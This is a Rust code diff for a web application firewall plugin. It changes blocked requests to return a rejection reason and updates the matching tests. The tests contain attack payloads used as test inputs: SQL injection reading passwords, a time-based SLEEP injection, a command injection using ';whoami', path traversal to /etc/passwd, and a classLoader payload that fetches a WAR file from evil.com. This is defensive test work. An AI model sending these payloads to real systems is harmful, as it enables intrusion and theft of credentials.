@@ -7,9 +7,8 @@
 use std::collections::HashSet;
 use std::str::FromStr;
 
-use http::StatusCode;
 use http::header::{HeaderName, HeaderValue};
-use velda_core::{Action, L7Request, L7Response};
+use velda_core::{Action, L7Request, RejectReason};
 use velda_sync::post_sync::plugin::PluginConfig;
 
 use super::dictionary::ThreatVector;
@@ -69,7 +68,6 @@ pub struct WafLitePlugin {
     pub custom_blocked_patterns: Vec<String>,
     pub custom_blocked_user_agents: Vec<String>,
     pub matcher: WafMatcher,
-    forbidden_response: L7Response,
 }
 
 impl WafLitePlugin {
@@ -82,15 +80,6 @@ impl WafLitePlugin {
         custom_blocked_patterns: Vec<String>,
         custom_blocked_user_agents: Vec<String>,
     ) -> Result<Self, PluginError> {
-        let forbidden_response = L7Response::from_bytes(
-            StatusCode::FORBIDDEN,
-            "{\"error\":\"Forbidden: Malicious payload detected\"}",
-        )
-        .with_header(
-            http::header::CONTENT_TYPE,
-            HeaderValue::from_static("application/json"),
-        );
-
         let mut seen_pats = HashSet::with_capacity(custom_blocked_patterns.len());
         let mut deduped_patterns = Vec::with_capacity(custom_blocked_patterns.len());
         for p in custom_blocked_patterns {
@@ -124,7 +113,6 @@ impl WafLitePlugin {
             custom_blocked_patterns: deduped_patterns,
             custom_blocked_user_agents: deduped_uas,
             matcher,
-            forbidden_response,
         })
     }
 
@@ -197,7 +185,7 @@ impl WafLitePlugin {
     #[inline]
     fn handle_threat(&self, req: &mut L7Request, vector: ThreatVector) -> Action {
         match self.mode {
-            WafMode::Block => Action::Respond(self.forbidden_response.clone()),
+            WafMode::Block => Action::Reject(RejectReason::Forbidden),
             WafMode::DetectOnly => {
                 req.headers.insert(X_WAF_THREAT_DETECTED, HEADER_TRUE);
                 req.headers
@@ -299,17 +287,7 @@ mod tests {
             HeaderMap::new(),
         );
         let action = plugin.on_request(&mut req);
-
-        match action {
-            Action::Respond(resp) => {
-                assert_eq!(resp.status, StatusCode::FORBIDDEN);
-                assert_eq!(
-                    resp.headers.get("content-type").unwrap(),
-                    "application/json"
-                );
-            }
-            _ => panic!("Expected Action::Respond(403)"),
-        }
+        assert!(matches!(action, Action::Reject(RejectReason::Forbidden)));
     }
 
     #[test]
@@ -327,11 +305,7 @@ mod tests {
             HeaderMap::new(),
         );
         let action = plugin.on_request(&mut req);
-
-        match action {
-            Action::Respond(resp) => assert_eq!(resp.status, StatusCode::FORBIDDEN),
-            _ => panic!("Expected Action::Respond(403)"),
-        }
+        assert!(matches!(action, Action::Reject(RejectReason::Forbidden)));
     }
 
     #[test]
@@ -349,11 +323,7 @@ mod tests {
             HeaderMap::new(),
         );
         let action = plugin.on_request(&mut req);
-
-        match action {
-            Action::Respond(resp) => assert_eq!(resp.status, StatusCode::FORBIDDEN),
-            _ => panic!("Expected Action::Respond(403)"),
-        }
+        assert!(matches!(action, Action::Reject(RejectReason::Forbidden)));
     }
 
     #[test]
@@ -371,11 +341,7 @@ mod tests {
             HeaderMap::new(),
         );
         let action = plugin.on_request(&mut req);
-
-        match action {
-            Action::Respond(resp) => assert_eq!(resp.status, StatusCode::FORBIDDEN),
-            _ => panic!("Expected Action::Respond(403)"),
-        }
+        assert!(matches!(action, Action::Reject(RejectReason::Forbidden)));
     }
 
     #[test]
@@ -396,11 +362,7 @@ mod tests {
 
         let mut req = build_test_request("/api/v1/users", headers);
         let action = plugin.on_request(&mut req);
-
-        match action {
-            Action::Respond(resp) => assert_eq!(resp.status, StatusCode::FORBIDDEN),
-            _ => panic!("Expected Action::Respond(403)"),
-        }
+        assert!(matches!(action, Action::Reject(RejectReason::Forbidden)));
     }
 
     #[test]
@@ -419,11 +381,7 @@ mod tests {
 
         let mut req = build_test_request("/api/v1/auth", headers);
         let action = plugin.on_request(&mut req);
-
-        match action {
-            Action::Respond(resp) => assert_eq!(resp.status, StatusCode::FORBIDDEN),
-            _ => panic!("Expected Action::Respond(403) due to raw byte JNDI match"),
-        }
+        assert!(matches!(action, Action::Reject(RejectReason::Forbidden)));
     }
 
     #[test]
@@ -446,11 +404,7 @@ mod tests {
 
         let mut req = build_test_request("/api/v1/auth", headers);
         let action = plugin.on_request(&mut req);
-
-        match action {
-            Action::Respond(resp) => assert_eq!(resp.status, StatusCode::FORBIDDEN),
-            _ => panic!("Expected Action::Respond(403) when scanning duplicate headers"),
-        }
+        assert!(matches!(action, Action::Reject(RejectReason::Forbidden)));
     }
 
     #[test]
@@ -578,11 +532,7 @@ mod tests {
 
         let mut req = build_test_request("/api/v1/auth", headers);
         let action = plugin.on_request(&mut req);
-
-        match action {
-            Action::Respond(resp) => assert_eq!(resp.status, StatusCode::FORBIDDEN),
-            _ => panic!("Expected Action::Respond(403) on nested Log4j evasion"),
-        }
+        assert!(matches!(action, Action::Reject(RejectReason::Forbidden)));
     }
 
     #[test]
@@ -599,13 +549,19 @@ mod tests {
             "/api/v1/items?id=1%27UNION(SELECT%20password%20FROM%20users)",
             HeaderMap::new(),
         );
-        assert!(matches!(plugin.on_request(&mut req1), Action::Respond(_)));
+        assert!(matches!(
+            plugin.on_request(&mut req1),
+            Action::Reject(RejectReason::Forbidden)
+        ));
 
         let mut req2 = build_test_request(
             "/api/v1/items?id=1%27%20AND%20SLEEP(5)--%20",
             HeaderMap::new(),
         );
-        assert!(matches!(plugin.on_request(&mut req2), Action::Respond(_)));
+        assert!(matches!(
+            plugin.on_request(&mut req2),
+            Action::Reject(RejectReason::Forbidden)
+        ));
     }
 
     #[test]
@@ -619,15 +575,24 @@ mod tests {
         );
 
         let mut req1 = build_test_request("/api/v1/users;whoami", HeaderMap::new());
-        assert!(matches!(plugin.on_request(&mut req1), Action::Respond(_)));
+        assert!(matches!(
+            plugin.on_request(&mut req1),
+            Action::Reject(RejectReason::Forbidden)
+        ));
 
         let mut req2 = build_test_request("/api/..;/..;/etc/passwd", HeaderMap::new());
-        assert!(matches!(plugin.on_request(&mut req2), Action::Respond(_)));
+        assert!(matches!(
+            plugin.on_request(&mut req2),
+            Action::Reject(RejectReason::Forbidden)
+        ));
 
         let mut req3 = build_test_request(
             "/api/v1/user?class.module.classLoader.URLs%5B0%5D=jar:http://evil.com/x.war!/",
             HeaderMap::new(),
         );
-        assert!(matches!(plugin.on_request(&mut req3), Action::Respond(_)));
+        assert!(matches!(
+            plugin.on_request(&mut req3),
+            Action::Reject(RejectReason::Forbidden)
+        ));
     }
 }
